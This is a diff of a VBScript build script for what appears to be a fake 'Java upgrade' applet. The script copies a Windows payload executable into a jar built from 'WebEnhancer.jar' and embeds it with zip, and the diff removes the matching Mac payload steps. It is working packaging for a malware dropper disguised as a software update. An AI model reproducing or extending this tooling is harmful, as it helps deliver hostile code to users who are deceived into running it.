@@ -39,8 +39,7 @@ Set WshShell = CreateObject("WScript.Shell")
 WshShell.CurrentDirectory = TmpDir
 
 UpgradeApplet = "JavaUpgrade-" & OutputName & ".jar"
-PayloadWin = Payload & ".exe"
-PayloadMac = Payload
+PayloadWin = OutputName & ".exe"
 JarFile =  "WebEnhancer.jar"
 
 ' delete any signed applet with the same name, if exists
@@ -60,21 +59,12 @@ If not objFSO.FileExists(PayloadWin) then
 	WScript.Quit 1
 End If
 
-If not objFSO.FileExists(PayloadMac) then
-	WScript.Echo "Cannot find Mac payload file " & PayloadWin
-	WScript.Quit 1
-End If
-
 objFSO.CopyFile PayloadWin, "win"
-objFSO.CopyFile PayloadMac, "mac"
 
 WScript.Echo "Adding payload to jar file."
 
 WScript.Echo "Embedding Windows payload."
 Ret = WshShell.Run("zip -u " & UpgradeApplet & " win", 0, true)
-
-WScript.Echo "Embedding Mac payload."
-Ret = WshShell.Run("zip -u " & UpgradeApplet & " mac", 0, true) 
 
 ' Create java-map-update-#output#.xml
 JavaMapUpdateSource = "java-map-update.xml"
